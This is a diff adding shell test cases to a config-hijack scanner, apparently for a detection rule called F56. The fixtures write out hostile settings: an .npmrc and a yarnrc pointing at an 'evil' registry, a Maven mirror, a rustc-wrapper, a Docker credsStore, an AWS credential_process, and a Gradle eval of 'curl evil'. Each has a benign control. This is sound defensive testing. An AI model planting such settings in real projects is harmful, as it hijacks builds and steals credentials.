@@ -8652,6 +8652,67 @@ printf -- '--hidden\n--follow\n' > "$XDIR/m2/.ripgreprc"
 ./hlse_core file "$XDIR/m2/.ripgreprc" 2>&1 | grep -q "F56" \
     && check "file: benign ripgreprc no F56" "0" "1" \
     || check "file: benign ripgreprc no F56" "0" "0"
+# F56: package-manager / cloud-credential config hijack carriers
+mkdir -p "$XDIR/pm1" "$XDIR/pm2"
+printf 'registry=http://evil.com\nscript-shell=/bin/sh\n' > "$XDIR/pm1/.npmrc"
+./hlse_core file "$XDIR/pm1/.npmrc" 2>&1 | grep -q "F56" \
+    && check "file: npmrc registry flagged" "0" "0" \
+    || check "file: npmrc registry flagged" "0" "1"
+printf 'save-exact=true\n' > "$XDIR/pm2/.npmrc"
+./hlse_core file "$XDIR/pm2/.npmrc" 2>&1 | grep -q "F56" \
+    && check "file: benign npmrc no F56" "0" "1" \
+    || check "file: benign npmrc no F56" "0" "0"
+printf 'npmRegistryServer: "http://evil"\nunsafeHttpWhitelist: ["*"]\n' \
+    > "$XDIR/pm1/.yarnrc.yml"
+./hlse_core file "$XDIR/pm1/.yarnrc.yml" 2>&1 | grep -q "F56" \
+    && check "file: yarnrc registry flagged" "0" "0" \
+    || check "file: yarnrc registry flagged" "0" "1"
+printf 'nodeLinker: node-modules\n' > "$XDIR/pm2/.yarnrc.yml"
+./hlse_core file "$XDIR/pm2/.yarnrc.yml" 2>&1 | grep -q "F56" \
+    && check "file: benign yarnrc no F56" "0" "1" \
+    || check "file: benign yarnrc no F56" "0" "0"
+printf 'module.exports={hooks:{readPackage:p=>p}}\neval("x")\n' \
+    > "$XDIR/pm1/.pnpmfile.cjs"
+./hlse_core file "$XDIR/pm1/.pnpmfile.cjs" 2>&1 | grep -q "F56" \
+    && check "file: pnpmfile eval flagged" "0" "0" \
+    || check "file: pnpmfile eval flagged" "0" "1"
+mkdir -p "$XDIR/cc1" "$XDIR/cc2" "$XDIR/cc3"
+printf '[build]\nrustc-wrapper = "/tmp/evil"\n' > "$XDIR/cc1/config.toml"
+./hlse_core file "$XDIR/cc1/config.toml" 2>&1 | grep -q "F56" \
+    && check "file: cargo rustc-wrapper flagged" "0" "0" \
+    || check "file: cargo rustc-wrapper flagged" "0" "1"
+printf '[net]\nretry = 3\n' > "$XDIR/cc2/config.toml"
+./hlse_core file "$XDIR/cc2/config.toml" 2>&1 | grep -q "F56" \
+    && check "file: benign config.toml no F56" "0" "1" \
+    || check "file: benign config.toml no F56" "0" "0"
+printf '{"credsStore":"/tmp/evil"}\n' > "$XDIR/cc3/config.json"
+./hlse_core file "$XDIR/cc3/config.json" 2>&1 | grep -q "F56" \
+    && check "file: docker credsStore flagged" "0" "0" \
+    || check "file: docker credsStore flagged" "0" "1"
+printf '{"theme":"dark"}\n' > "$XDIR/cc2/config.json"
+./hlse_core file "$XDIR/cc2/config.json" 2>&1 | grep -q "F56" \
+    && check "file: benign config.json no F56" "0" "1" \
+    || check "file: benign config.json no F56" "0" "0"
+mkdir -p "$XDIR/mv1" "$XDIR/gr1"
+printf '<settings><mirrors><mirror><url>http://evil</url></mirror></mirrors></settings>\n' \
+    > "$XDIR/mv1/settings.xml"
+./hlse_core file "$XDIR/mv1/settings.xml" 2>&1 | grep -q "F56" \
+    && check "file: settings.xml mirror flagged" "0" "0" \
+    || check "file: settings.xml mirror flagged" "0" "1"
+printf 'allprojects { eval "curl evil" }\n' > "$XDIR/gr1/init.gradle"
+./hlse_core file "$XDIR/gr1/init.gradle" 2>&1 | grep -q "F56" \
+    && check "file: init.gradle eval flagged" "0" "0" \
+    || check "file: init.gradle eval flagged" "0" "1"
+mkdir -p "$XDIR/aws1" "$XDIR/aws1/.aws" "$XDIR/aws2" "$XDIR/aws2/.aws"
+printf '[profile x]\ncredential_process = /tmp/evil\n' \
+    > "$XDIR/aws1/.aws/config"
+./hlse_core file "$XDIR/aws1/.aws/config" 2>&1 | grep -q "F18\|F56" \
+    && check "file: aws credential_process flagged" "0" "0" \
+    || check "file: aws credential_process flagged" "0" "1"
+printf '[default]\nregion = us-east-1\n' > "$XDIR/aws2/.aws/config"
+./hlse_core file "$XDIR/aws2/.aws/config" 2>&1 | grep -q "F18\|F56" \
+    && check "file: benign aws config no flag" "0" "1" \
+    || check "file: benign aws config no flag" "0" "0"
 # F56: credential/session carrier files
 printf '{"log":{"entries":[{"request":{"cookies":[{"name":"s","value":"x"}]}}]}}\n' \
     > "$XDIR/x.har"
